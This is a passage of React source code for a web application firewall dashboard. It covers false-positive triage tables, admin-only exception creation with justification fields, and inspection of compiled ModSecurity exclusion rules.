              <HighlightedJson json={entry.raw_log || entry} />
            </div>
          </div>

        </div>
        <div className="modal-footer" style={{ display: 'flex', justifyContent: 'space-between', width: '100%', alignItems: 'center' }}>
          <div>
            <button
              className="modal-btn secondary"
              onClick={() => {
                onDeleteEntry(entry.id);
                onClose();
              }}
              style={{ borderColor: 'rgba(239, 68, 68, 0.4)', color: '#fca5a5' }}
            >
              Delete Record
            </button>
          </div>
          <div style={{ display: 'flex', gap: '10px' }}>
            <button className="modal-btn secondary" onClick={onClose}>Close</button>
            {userRole === 'admin' && entry.status !== 'Resolved' && (
              <button
                className="modal-btn primary"
                onClick={() => {
                  onCreateException(entry);
                  onClose();
                }}
                style={{ background: '#f97316', borderColor: '#f97316', color: '#000', fontWeight: 600 }}
              >
                Bypass & Create Exception
              </button>
            )}
          </div>
        </div>
      </div>
    </div>,
    document.body
  );
}

function FalsePositives({ userRole, onCreateException }) {
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(true);
  const [statusFilter, setStatusFilter] = useState('');
  const [severityFilter, setSeverityFilter] = useState('');
  const [search, setSearch] = useState('');
  const [ruleIdSearch, setRuleIdSearch] = useState('');
  const [selectedLog, setSelectedLog] = useState(null);
  const [isLogModalOpen, setIsLogModalOpen] = useState(false);
  const [successMsg, setSuccessMsg] = useState('');

  const fetchFP = async () => {
    setLoading(true);
    try {
      const filters = {};
      if (statusFilter) filters.status = statusFilter;
      if (severityFilter) filters.severity = severityFilter;
      if (ruleIdSearch.trim()) filters.rule_id = ruleIdSearch.trim();
      if (search.trim()) filters.search = search.trim();

      const data = await getFalsePositives(filters);
      setEntries(data);
    } catch (err) {
      console.error("Failed to load false positives", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchFP();
    }, 0);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [statusFilter, severityFilter, ruleIdSearch, search]);

  const handleUpdateStatus = async (id, status) => {
    try {
      await updateFalsePositiveStatus(id, status);
      setSuccessMsg(`Triage status updated to ${status}!`);
      fetchFP();
      setSelectedLog(prev => prev ? { ...prev, status: status } : null);
      setTimeout(() => setSuccessMsg(''), 3000);
    } catch (err) {
      console.error("Failed to update status", err);
    }
  };

  const handleSaveNote = async (id, noteText) => {
    try {
      await updateFalsePositiveNote(id, noteText);
      setSuccessMsg("Analyst note updated successfully!");
      fetchFP();
      setSelectedLog(prev => prev ? { ...prev, analyst_note: noteText } : null);
      setTimeout(() => setSuccessMsg(''), 3000);
    } catch (err) {
      console.error("Failed to update note", err);
    }
  };

  const handleDeleteEntry = async (id) => {
    if (!window.confirm("Are you sure you want to remove this false positive record from WAF diagnostics?")) return;
    try {
      await deleteFalsePositive(id);
      setSuccessMsg("Record removed successfully!");
      fetchFP();
      setTimeout(() => setSuccessMsg(''), 3000);
    } catch (err) {
      console.error("Failed to delete false positive entry", err);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -15 }}
      transition={{ duration: 0.25 }}
      style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
    >
      {/* Toast Alert */}
      <AnimatePresence>
        {successMsg && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            style={{
              position: 'fixed', top: '24px', right: '24px', background: 'var(--success-color)', color: '#000',
              padding: '12px 24px', borderRadius: '8px', zIndex: 10000, fontWeight: 600, display: 'flex', gap: '8px', alignItems: 'center',
              boxShadow: '0 10px 15px -3px var(--success-glow)'
            }}
          >
            <ShieldCheck size={18} />
            <span>{successMsg}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Statistics Cards */}
      <div className="dashboard-grid animate-fade-in" style={{ gap: '16px', marginBottom: '8px' }}>
        <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
          <div className="metric-header">
            <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              Total False Positive Reports
              <HelpText>
                False positives are legitimate requests that were incorrectly blocked by the WAF. Review these to fine-tune your rules and reduce unnecessary blocks for real users.
              </HelpText>
            </span>
            <div className="metric-icon-wrapper blue"><Database size={18} /></div>
          </div>
          <div className="metric-value">{entries.length}</div>
          <div className="metric-trend trend-down">
            <span>Triage & review candidates</span>
          </div>
        </div>
        <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
          <div className="metric-header">
            <span>Pending Review</span>
            <div className="metric-icon-wrapper orange"><Clock size={18} /></div>
          </div>
          <div className="metric-value" style={{ color: '#eab308' }}>
            {entries.filter(e => e.status === 'Pending').length}
          </div>
          <div className="metric-trend trend-up">
            <span>Awaiting analyst tuning</span>
          </div>
        </div>
        <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
          <div className="metric-header">
            <span>Tuned & Resolved</span>
            <div className="metric-icon-wrapper green"><ShieldCheck size={18} /></div>
          </div>
          <div className="metric-value" style={{ color: '#10b981' }}>
            {entries.filter(e => e.status === 'Resolved').length}
          </div>
          <div className="metric-trend trend-down">
            <span>WAF exception bypasses active</span>
          </div>
        </div>
      </div>

      {/* Filter Toolbar */}
      <div className="glass-panel" style={{ padding: '16px 20px', display: 'flex', flexWrap: 'wrap', gap: '16px', alignItems: 'center' }}>
        <div style={{ position: 'relative', flex: 1, minWidth: '200px' }}>
          <Search size={16} color="#a1a1aa" style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)' }} />
          <input
            type="text"
            className="search-input"
            style={{ paddingLeft: '36px', height: '38px', margin: 0, width: '100%' }}
            placeholder="Search IP, URI or analyst note..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
        </div>
        <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Filter size={14} color="#a1a1aa" />
            <select
              className="filter-select"
              style={{ width: '130px', height: '38px', margin: 0, fontSize: '13px' }}
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
            >
              <option value="">All Statuses</option>
              <option value="Pending">Pending</option>
              <option value="Reviewed">Reviewed</option>
              <option value="Resolved">Resolved</option>
            </select>
          </div>
          <select
            className="filter-select"
            style={{ width: '130px', height: '38px', margin: 0, fontSize: '13px' }}
            value={severityFilter}
            onChange={(e) => setSeverityFilter(e.target.value)}
          >
            <option value="">All Severities</option>
            <option value="Critical">Critical</option>
            <option value="High">High</option>
            <option value="Medium">Medium</option>
            <option value="Low">Low</option>
          </select>
          <input
            type="text"
            className="search-input"
            style={{ width: '120px', height: '38px', margin: 0, fontSize: '13px', paddingLeft: '12px' }}
            placeholder="Rule ID..."
            value={ruleIdSearch}
            onChange={(e) => setRuleIdSearch(e.target.value)}
          />
        </div>
      </div>

      {/* False Positive Log Table */}
      <div className="table-container glass-panel" style={{ padding: 0 }}>
        {loading ? (
          <div style={{ padding: '40px', textAlign: 'center', color: '#a1a1aa' }}>Loading review registry...</div>
        ) : entries.length === 0 ? (
          <NoFalsePositivesEmptyState />
        ) : (
          <table className="logs-table">
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>Rule ID</th>
                <th>IP Address</th>
                <th>Requested URI</th>
                <th>Severity</th>
                <th>Status</th>
                <th>Analyst Note</th>
                <th style={{ textAlign: 'right' }}>Actions</th>
              </tr>
            </thead>
            <tbody>
                {entries.map((entry) => {
                  const statusColors = {
                    Pending: { bg: 'rgba(234,179,8,0.1)', color: '#fef08a', border: '1px solid rgba(234,179,8,0.2)' },
                    Reviewed: { bg: 'rgba(59,130,246,0.1)', color: '#93c5fd', border: '1px solid rgba(59,130,246,0.2)' },
                    Resolved: { bg: 'rgba(16,185,129,0.1)', color: '#a7f3d0', border: '1px solid rgba(16,185,129,0.2)' },
                  };
                  const colors = statusColors[entry.status] || statusColors.Pending;

                  return (
                    <tr
                      key={entry.id}
                      className="log-row"
                    >
                      <td style={{ fontSize: '12px', color: '#94a3b8' }}>{formatLocalTime(entry.timestamp)}</td>
                      <td>
                        <span className="log-rule-id" style={{ background: 'rgba(255,255,255,0.05)', color: '#e2e8f0', fontSize: '11px', padding: '3px 6px', borderRadius: '4px', fontFamily: 'monospace', border: '1px solid rgba(255,255,255,0.08)' }}>
                          {entry.rule_id}
                        </span>
                      </td>
                      <td style={{ fontFamily: 'monospace', color: '#38bdf8', fontSize: '13px' }}>{entry.client_ip}</td>
                      <td className="payload-cell" style={{ fontFamily: 'monospace', fontSize: '12px', color: '#cbd5e1', maxWidth: '180px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={entry.uri}>
                        {entry.uri}
                      </td>
                      <td>
                        <span className={`severity-badge severity-${entry.severity.toLowerCase()}`}>
                          {entry.severity}
                        </span>
                      </td>
                      <td>
                        <span style={{
                          fontSize: '10px',
                          fontWeight: 700,
                          padding: '3px 8px',
                          borderRadius: '12px',
                          background: colors.bg,
                          color: colors.color,
                          border: colors.border,
                          textTransform: 'uppercase'
                        }}>
                          {entry.status}
                        </span>
                      </td>
                      <td style={{ fontSize: '12px', color: '#94a3b8', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={entry.analyst_note}>
                        {entry.analyst_note || <em style={{ opacity: 0.5 }}>No note</em>}
                      </td>
                      <td style={{ textAlign: 'right' }}>
                        <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
                          <button
                            className="action-btn-inspect"
                            onClick={() => {
                              setSelectedLog(entry);
                              setIsLogModalOpen(true);
                            }}
                            style={{ padding: '4px 8px', fontSize: '11px' }}
                          >
                            Inspect
                          </button>

                          {userRole === 'admin' && entry.status !== 'Resolved' && (
                            <button
                              className="action-btn-inspect"
                              onClick={() => onCreateException(entry)}
                              style={{ padding: '4px 8px', fontSize: '11px', borderColor: 'rgba(249, 115, 22, 0.4)', color: '#fdba74' }}
                            >
                              Bypass WAF
                            </button>
                          )}
                        </div>
                      </td>
                    </tr>
                  );
                })}
            </tbody>
          </table>
        )}
      </div>

      {/* Dedicated False Positive Inspector Modal */}
      <FalsePositiveDetailsModal
        isOpen={isLogModalOpen}
        entry={selectedLog}
        onClose={() => {
          setIsLogModalOpen(false);
          setSelectedLog(null);
        }}
        onUpdateStatus={handleUpdateStatus}
        onSaveNote={handleSaveNote}
        onCreateException={onCreateException}
        onDeleteEntry={handleDeleteEntry}
        userRole={userRole}
      />
    </motion.div>
  );
}

function CreateExceptionModal({ isOpen, log, onClose, onSubmit }) {
  const [exclusionType, setExclusionType] = useState('uri');
  const [uri, setUri] = useState('');
  const [parameterName, setParameterName] = useState('');
  const [httpMethod, setHttpMethod] = useState('GET');
  const [clientIp, setClientIp] = useState('');
  const [notes, setNotes] = useState('');
  const [previewRule, setPreviewRule] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    if (isOpen && log) {
      const timer = setTimeout(() => {
        setExclusionType('uri');
        setUri(log.uri || '/');
        setParameterName('');
        setHttpMethod(log.method || 'GET');
        setClientIp(log.client_ip || '');
        setNotes('');
        setPreviewRule('');
        setErrorMsg('');
      }, 0);
      return () => clearTimeout(timer);
    }
  }, [isOpen, log]);

  useEffect(() => {
    if (!isOpen || !log) return;

    const fetchPreview = async () => {
      try {
        const payload = {
          rule_id: log.rule_id,
          exclusion_type: exclusionType,
          uri: exclusionType !== 'parameter' ? uri : null,
          parameter_name: (exclusionType === 'parameter' || exclusionType === 'uri_parameter') ? parameterName : null,
          http_method: exclusionType === 'endpoint_method' ? httpMethod : null,
          client_ip: exclusionType === 'ip_suppression' ? clientIp : null
        };
        const res = await previewExclusionRule(payload);
        setPreviewRule(res.modsec_rule);
        setErrorMsg('');
      } catch (err) {
        setPreviewRule('');
        setErrorMsg(err.message || 'Error compiling rule preview.');
      }
    };

    const delayDebounce = setTimeout(fetchPreview, 250);
    return () => clearTimeout(delayDebounce);
  }, [exclusionType, uri, parameterName, httpMethod, clientIp, isOpen, log]);

  if (!isOpen || !log) return null;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    setErrorMsg('');

    if (exclusionType !== 'parameter' && (uri === '/' || uri.trim() === '')) {
      setErrorMsg("Broad exclusions on the root path ('/') are blocked to protect WAF integrity.");
      setSubmitting(false);
      return;
    }

    try {
      const payload = {
        false_positive_id: log.id,
        rule_id: log.rule_id,
        exclusion_type: exclusionType,
        uri: exclusionType !== 'parameter' ? uri : null,
        parameter_name: (exclusionType === 'parameter' || exclusionType === 'uri_parameter') ? parameterName : null,
        http_method: exclusionType === 'endpoint_method' ? httpMethod : null,
        client_ip: exclusionType === 'ip_suppression' ? clientIp : null,
        notes: notes
      };
      await onSubmit(payload);
      onClose();
    } catch (err) {
      setErrorMsg(err.message || 'Failed to create exclusion policy.');
    } finally {
      setSubmitting(false);
    }
  };

  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '560px' }}>
        <div className="modal-header">
          <div className="modal-title">
            <AlertTriangle size={20} color="#f97316" />
            <span>Create WAF Exception Exclusions</span>
          </div>
          <button className="modal-close-btn" onClick={onClose}>
            <X size={18} />
          </button>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
            {errorMsg && (
              <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.25)', color: '#fca5a5', padding: '10px 14px', borderRadius: '6px', fontSize: '13px' }}>
                {errorMsg}
              </div>
            )}

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '12px' }}>
              <div>
                <span style={{ color: '#a1a1aa' }}>Origin Log Rule ID:</span>
                <div style={{ fontFamily: 'monospace', fontWeight: 600, color: '#fff', marginTop: '2px' }}>{log.rule_id}</div>
              </div>
              <div>
                <span style={{ color: '#a1a1aa' }}>Attack Category:</span>
                <div style={{ fontWeight: 600, color: '#eab308', marginTop: '2px' }}>{log.attack_type}</div>
              </div>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Exception Strategy</label>
              <select
                className="filter-select"
                style={{ width: '100%', height: '36px' }}
                value={exclusionType}
                onChange={(e) => setExclusionType(e.target.value)}
              >
                <option value="uri">Exclude Rule ID for this URI / Endpoint</option>
                <option value="parameter">Exclude Rule ID for this Parameter globally</option>
                <option value="uri_parameter">Exclude Rule ID for this Parameter on this URI</option>
                <option value="endpoint_method">Exclude Rule ID for this URI and HTTP Method</option>
                <option value="ip_suppression">Suppress Alerts for this Client IP and URI</option>
              </select>
            </div>

            {exclusionType !== 'parameter' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Target Endpoint URI</label>
                <input
                  type="text"
                  className="search-input"
                  style={{ width: '100%', height: '36px', fontSize: '13px', fontFamily: 'monospace' }}
                  value={uri}
                  onChange={(e) => setUri(e.target.value)}
                  required
                />
              </div>
            )}

            {(exclusionType === 'parameter' || exclusionType === 'uri_parameter') && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Target Parameter Name</label>
                <input
                  type="text"
                  className="search-input"
                  style={{ width: '100%', height: '36px', fontSize: '13px', fontFamily: 'monospace' }}
                  placeholder="e.g. username, search_query, comment"
                  value={parameterName}
                  onChange={(e) => setParameterName(e.target.value)}
                  required
                />
              </div>
            )}

            {exclusionType === 'endpoint_method' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>HTTP Method</label>
                <select
                  className="filter-select"
                  style={{ width: '100%', height: '36px' }}
                  value={httpMethod}
                  onChange={(e) => setHttpMethod(e.target.value)}
                >
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                  <option value="DELETE">DELETE</option>
                  <option value="PATCH">PATCH</option>
                </select>
              </div>
            )}

            {exclusionType === 'ip_suppression' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Target Client IP Address</label>
                <input
                  type="text"
                  className="search-input"
                  style={{ width: '100%', height: '36px', fontSize: '13px', fontFamily: 'monospace' }}
                  value={clientIp}
                  onChange={(e) => setClientIp(e.target.value)}
                  required
                />
              </div>
            )}

            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              <label style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa' }}>Justification Reason</label>
              <textarea
                className="settings-input"
                style={{ height: '80px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '10px' }}
                placeholder="E.g., verified search query parameters as legitimate business traffic..."
                value={notes}
                onChange={(e) => setNotes(e.target.value)}
                required
              />
            </div>

            {previewRule && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Auto-Generated CyberSentinel Engine Rule Preview</span>
                <pre style={{ margin: 0, padding: '12px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px', color: '#10b981', fontFamily: 'monospace', fontSize: '11px', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                  {previewRule}
                </pre>
              </div>
            )}
          </div>
          <div className="modal-footer" style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
            <button type="button" className="modal-btn secondary" onClick={onClose}>Cancel</button>
            <button type="submit" className="modal-btn primary" disabled={submitting} style={{ background: '#f97316', borderColor: '#f97316', color: '#000', fontWeight: 600 }}>
              {submitting ? "Applying exception..." : "Apply WAF Exception"}
            </button>
          </div>
        </form>
      </div>
    </div>,
    document.body
  );
}

function ExclusionDetailsModal({ isOpen, exclusion, onClose }) {
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (copied) {
      const t = setTimeout(() => setCopied(false), 2000);
      return () => clearTimeout(t);
    }
  }, [copied]);

  if (!isOpen || !exclusion) return null;

  const handleCopy = () => {
    navigator.clipboard.writeText(exclusion.modsec_rule)
      .then(() => setCopied(true))
      .catch(err => console.error("Copy failed", err));
  };

  const typeLabels = {
    uri: 'URI-Specific Bypass',
    parameter: 'Global Parameter Exclusion',
    uri_parameter: 'Parameter Bypass on URI',
    endpoint_method: 'Endpoint & Method Exclusion',
    ip_suppression: 'Client IP & URI Alert Suppression'
  };

  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '580px' }}>
        <div className="modal-header">
          <div className="modal-title">
            <ShieldCheck size={20} color="#10b981" />
            <span>Active Exclusion Rule Config</span>
          </div>
          <button className="modal-close-btn" onClick={onClose}>
            <X size={18} />
          </button>
        </div>
        <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '13px' }}>
            <div>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Exclusion Policy ID:</span>
              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontFamily: 'monospace' }}>EX-Ref #{exclusion.id}</div>
            </div>
            <div>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Target WAF Rule ID:</span>
              <div style={{ fontWeight: 600, color: '#fdba74', marginTop: '2px', fontFamily: 'monospace' }}>Rule #{exclusion.rule_id}</div>
            </div>
            <div style={{ marginTop: '8px' }}>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Strategy Type:</span>
              <div style={{ fontWeight: 600, color: '#3b82f6', marginTop: '2px' }}>{typeLabels[exclusion.exclusion_type] || exclusion.exclusion_type}</div>
            </div>
            <div style={{ marginTop: '8px' }}>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Created By / When:</span>
              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontSize: '12px' }}>@{exclusion.created_by} on <span style={{ color: '#a1a1aa' }}>{exclusion.created_at}</span></div>
            </div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Scope Targets</span>
            <div style={{ background: 'rgba(0,0,0,0.2)', padding: '10px 14px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: '6px', fontFamily: 'monospace', fontSize: '12px' }}>
              {exclusion.uri && (
                <div>
                  <span style={{ color: '#a1a1aa' }}>URI Endpoint:</span> <span style={{ color: '#38bdf8' }}>{exclusion.uri}</span>
                </div>
              )}
              {exclusion.parameter_name && (
                <div>
                  <span style={{ color: '#a1a1aa' }}>Parameter:</span> <span style={{ color: '#fb923c' }}>{exclusion.parameter_name}</span>
                </div>
              )}
              {exclusion.http_method && (
                <div>
                  <span style={{ color: '#a1a1aa' }}>HTTP Method:</span> <span style={{ color: '#f43f5e' }}>{exclusion.http_method}</span>
                </div>
              )}
              {exclusion.client_ip && (
                <div>
                  <span style={{ color: '#a1a1aa' }}>Client IP:</span> <span style={{ color: '#10b981' }}>{exclusion.client_ip}</span>
                </div>
              )}
            </div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Justification Notes</span>
            <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '6px', padding: '12px', fontSize: '13px', color: '#cbd5e1', fontStyle: exclusion.notes ? 'normal' : 'italic', whiteSpace: 'pre-wrap' }}>
              {exclusion.notes || "No justification reason recorded."}
            </div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Compiled CyberSentinel Engine Rule Directive</span>
              <button
                onClick={handleCopy}
                style={{ background: 'transparent', border: 'none', color: copied ? '#10b981' : '#3b82f6', fontSize: '11px', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}
              >
                {copied ? <Check size={12} /> : <Copy size={12} />}
                <span>{copied ? 'Copied' : 'Copy Directive'}</span>
              </button>
            </div>
            <pre style={{ margin: 0, padding: '12px', background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px', color: '#10b981', fontFamily: 'monospace', fontSize: '11px', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
              {exclusion.modsec_rule}
            </pre>
          </div>

        </div>
        <div className="modal-footer">
          <button className="modal-btn secondary" onClick={onClose}>Close Inspector</button>
        </div>
      </div>
    </div>,
    document.body
  );
}

function Exceptions() {
  const [exclusions, setExclusions] = useState([]);
  const [analytics, setAnalytics] = useState(null);
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [statusFilter, setStatusFilter] = useState('');
  const [activeSubTab, setActiveSubTab] = useState('active_exceptions');

  const [editingExclusion, setEditingExclusion] = useState(null);
  const [editNotes, setEditNotes] = useState('');
  const [isNoteModalOpen, setIsNoteModalOpen] = useState(false);
  const [successMsg, setSuccessMsg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  const [selectedExclusion, setSelectedExclusion] = useState(null);
  const [isExclusionModalOpen, setIsExclusionModalOpen] = useState(false);

  const fetchExclusions = async () => {
    setLoading(true);
    try {
      const filters = {};
      if (search.trim()) filters.search = search.trim();
      if (statusFilter) filters.status = statusFilter;

      const [excData, anaData, histData] = await Promise.all([
        getExclusions(filters),
        getExclusionsAnalytics(),
        getExclusionsHistory()
      ]);

      setExclusions(excData);
      setAnalytics(anaData);
      setHistory(histData);
    } catch (err) {
      console.error("Failed to load exclusions", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchExclusions();
    }, 0);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [search, statusFilter]);

  const handleToggleStatus = async (id, currentStatus) => {
    const nextStatus = currentStatus === 'Active' ? 'Disabled' : 'Active';
    try {
      await updateExclusionStatus(id, nextStatus);
      setSuccessMsg(`Exception rule successfully ${nextStatus === 'Active' ? 'activated' : 'disabled'}!`);
      setTimeout(() => setSuccessMsg(''), 3000);
      fetchExclusions();
    } catch (err) {
      console.error("Failed to toggle status", err);
      alert(err.message || "Failed to update exception status.");
    }
  };

  const handleSaveNotes = async (e) => {
    e.preventDefault();
    try {
      await updateExclusionNote(editingExclusion.id, editNotes);
      setSuccessMsg("Exclusion notes updated successfully!");
      setIsNoteModalOpen(false);
      setTimeout(() => setSuccessMsg(''), 3000);
      fetchExclusions();
    } catch (err) {
      console.error("Failed to save exclusion notes", err);
      setErrorMsg(err.message || "Failed to update notes.");
    }
  };

  const handleDeleteExclusion = async (id) => {
    if (!window.confirm("Are you sure you want to permanently delete this exception policy? The target rule will instantly resume blocking traffic.")) return;
    try {
      await deleteExclusion(id);
      setSuccessMsg("Exclusion policy deleted and WAF synchronized.");
      setTimeout(() => setSuccessMsg(''), 3000);
      fetchExclusions();
    } catch (err) {
      console.error("Failed to delete exclusion", err);
      alert(err.message || "Failed to remove exclusion.");
    }
  };

  const handleInspectExclusion = (entry) => {
    setSelectedExclusion(entry);
    setIsExclusionModalOpen(true);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -15 }}
      transition={{ duration: 0.25 }}
      style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
    >
      <AnimatePresence>
        {successMsg && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            style={{
              position: 'fixed', top: '24px', right: '24px', background: 'var(--success-color)', color: '#000',
              padding: '12px 24px', borderRadius: '8px', zIndex: 10000, fontWeight: 600, display: 'flex', gap: '8px', alignItems: 'center',
              boxShadow: '0 10px 15px -3px var(--success-glow)'
            }}
          >
            <ShieldCheck size={18} />
            <span>{successMsg}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {analytics && (
        <div className="dashboard-grid animate-fade-in" style={{ gap: '16px', marginBottom: '8px' }}>
          <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
            <div className="metric-header">
              <span>Active WAF Exclusions</span>
              <div className="metric-icon-wrapper orange" style={{ background: 'rgba(249, 115, 22, 0.1)', color: '#f97316' }}><AlertTriangle size={18} /></div>
            </div>
            <div className="metric-value" style={{ color: '#f97316' }}>{analytics.active_exclusions}</div>
            <div className="metric-trend trend-up">
              <span>Active bypass rules overriding CRS</span>
            </div>
          </div>

          <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
            <div className="metric-header">
              <span>Global System Health</span>
              <div className="metric-icon-wrapper green"><ShieldCheck size={18} /></div>
            </div>
            <div className="metric-value" style={{ color: 'var(--success-color)' }}>100%</div>
            <div className="metric-trend trend-down">
              <span>System engine sync OK</span>
            </div>
          </div>

          <div className="metric-card glass-panel" style={{ gridColumn: 'span 4' }}>
            <div className="metric-header">
              <span>Disabled Exceptions</span>
              <div className="metric-icon-wrapper red"><X size={18} /></div>
            </div>
            <div className="metric-value" style={{ color: 'var(--danger-color)' }}>{analytics.disabled_exclusions}</div>
            <div className="metric-trend trend-down">
              <span>Deactivated exclusions</span>
            </div>
          </div>
        </div>
      )}

      <div className="subtabs-container">
        <button
          className={`subtab-btn ${activeSubTab === 'active_exceptions' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('active_exceptions')}
        >
          <AlertTriangle size={14} />
          <span>Active WAF Exclusions ({exclusions.length})</span>
        </button>
        <button
          className={`subtab-btn ${activeSubTab === 'audit_history' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('audit_history')}
        >
          <Database size={14} />
          <span>Exceptions Audit Logs ({history.length})</span>
        </button>
      </div>

      {activeSubTab === 'active_exceptions' && (
        <>
          <div className="glass-panel" style={{ padding: '16px 20px', display: 'flex', flexWrap: 'wrap', gap: '16px', alignItems: 'center' }}>
            <div style={{ position: 'relative', flex: 1, minWidth: '200px' }}>
              <Search size={16} color="#a1a1aa" style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)' }} />
              <input
                type="text"
                className="search-input"
                style={{ paddingLeft: '36px', height: '38px', margin: 0, width: '100%' }}
                placeholder="Search rule ID, endpoint, parameters, justification..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />
            </div>
            <div style={{ display: 'flex', gap: '12px' }}>
              <select
                className="filter-select"
                style={{ width: '150px', height: '38px', margin: 0, fontSize: '13px' }}
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value)}
              >
                <option value="">All Statuses</option>
                <option value="Active">Active</option>
                <option value="Disabled">Disabled</option>
              </select>
